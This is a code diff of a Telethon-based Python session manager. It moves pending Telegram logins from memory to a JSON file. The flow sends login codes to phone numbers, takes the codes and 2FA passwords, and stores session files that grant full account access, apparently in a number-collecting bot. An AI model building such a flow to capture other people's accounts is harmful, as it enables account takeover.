@@ -1,5 +1,6 @@
 # session_manager.py
 import os
+import json
 import asyncio
 from telethon import TelegramClient
 from telethon.errors import (
@@ -8,12 +9,12 @@ from telethon.errors import (
     PhoneNumberInvalidError,
     FloodWaitError
 )
-from config import API_ID, API_HASH, SESSIONS_FOLDER
 from database import add_number
 
-
-# تخزين مؤقت لحالة تسجيل الدخول لكل رقم
-pending_logins = {}
+API_ID = int(os.environ.get("API_ID", "0"))
+API_HASH = os.environ.get("API_HASH", "")
+SESSIONS_FOLDER = "sessions"
+PENDING_FILE = "pending_logins.json"
 
 
 def ensure_sessions_folder():
@@ -26,8 +27,45 @@ def get_session_path(phone):
     return os.path.join(SESSIONS_FOLDER, phone_clean)
 
 
+def save_pending(phone, data):
+    try:
+        if os.path.exists(PENDING_FILE):
+            with open(PENDING_FILE, 'r') as f:
+                all_data = json.load(f)
+        else:
+            all_data = {}
+        all_data[phone] = data
+        with open(PENDING_FILE, 'w') as f:
+            json.dump(all_data, f)
+    except Exception as e:
+        print("Error saving pending: " + str(e))
+
+
+def load_pending(phone):
+    try:
+        if os.path.exists(PENDING_FILE):
+            with open(PENDING_FILE, 'r') as f:
+                all_data = json.load(f)
+            return all_data.get(phone)
+    except Exception as e:
+        print("Error loading pending: " + str(e))
+    return None
+
+
+def remove_pending(phone):
+    try:
+        if os.path.exists(PENDING_FILE):
+            with open(PENDING_FILE, 'r') as f:
+                all_data = json.load(f)
+            if phone in all_data:
+                del all_data[phone]
+            with open(PENDING_FILE, 'w') as f:
+                json.dump(all_data, f)
+    except Exception as e:
+        print("Error removing pending: " + str(e))
+
+
 async def send_code(phone):
-    """المرحلة 1: إرسال كود التحقق إلى الرقم"""
     ensure_sessions_folder()
     session_path = get_session_path(phone)
 
@@ -36,12 +74,11 @@ async def send_code(phone):
 
     try:
         sent = await client.send_code_request(phone)
-        # حفظ الجلسة والكود في الذاكرة
-        pending_logins[phone] = {
-            "client": client,
+        save_pending(phone, {
             "phone_code_hash": sent.phone_code_hash,
             "session_path": session_path
-        }
+        })
+        await client.disconnect()
         return True, "sent", None
     except PhoneNumberInvalidError:
         await client.disconnect()
@@ -55,36 +92,36 @@ async def send_code(phone):
 
 
 async def verify_code(phone, code):
-    """المرحلة 2: تأكيد الكود وتسجيل الدخول"""
-    if phone not in pending_logins:
+    data = load_pending(phone)
+    if not data:
         return False, "not_started", None
 
-    data = pending_logins[phone]
-    client = data["client"]
     session_path = data["session_path"]
+    phone_code_hash = data["phone_code_hash"]
+
+    client = TelegramClient(session_path, API_ID, API_HASH)
+    await client.connect()
 
     try:
         await client.sign_in(
             phone=phone,
             code=code,
-            phone_code_hash=data["phone_code_hash"]
+            phone_code_hash=phone_code_hash
         )
         me = await client.get_me()
         await client.disconnect()
 
-        # حفظ الرقم في قاعدة البيانات
         add_number(phone, session_path)
-
-        # إزالة من الذاكرة
-        del pending_logins[phone]
+        remove_pending(phone)
 
         return True, "ok", me.first_name
 
     except SessionPasswordNeededError:
-        # الرقم عليه كلمة مرور 2FA
+        await client.disconnect()
         return False, "needs_2fa", None
 
     except PhoneCodeInvalidError:
+        await client.disconnect()
         return False, "invalid_code", None
 
     except Exception as e:
@@ -96,13 +133,14 @@ async def verify_code(phone, code):
 
 
 async def verify_password_2fa(phone, password):
-    """المرحلة 3 (اختيارية): كلمة مرور 2FA"""
-    if phone not in pending_logins:
+    data = load_pending(phone)
+    if not data:
         return False, "not_started", None
 
-    data = pending_logins[phone]
-    client = data["client"]
     session_path = data["session_path"]
+
+    client = TelegramClient(session_path, API_ID, API_HASH)
+    await client.connect()
 
     try:
         await client.sign_in(password=password)
@@ -110,7 +148,7 @@ async def verify_password_2fa(phone, password):
         await client.disconnect()
 
         add_number(phone, session_path)
-        del pending_logins[phone]
+        remove_pending(phone)
 
         return True, "ok", me.first_name
 
@@ -123,11 +161,5 @@ async def verify_password_2fa(phone, password):
 
 
 def cancel_pending(phone):
-    """إلغاء عملية تسجيل معلقة"""
-    if phone in pending_logins:
-        try:
-            asyncio.create_task(pending_logins[phone]["client"].disconnect())
-        except:
-            pass
-        del pending_logins[phone]
-# BOT_v2
+    remove_pending(phone)
+    # SESSION_v2
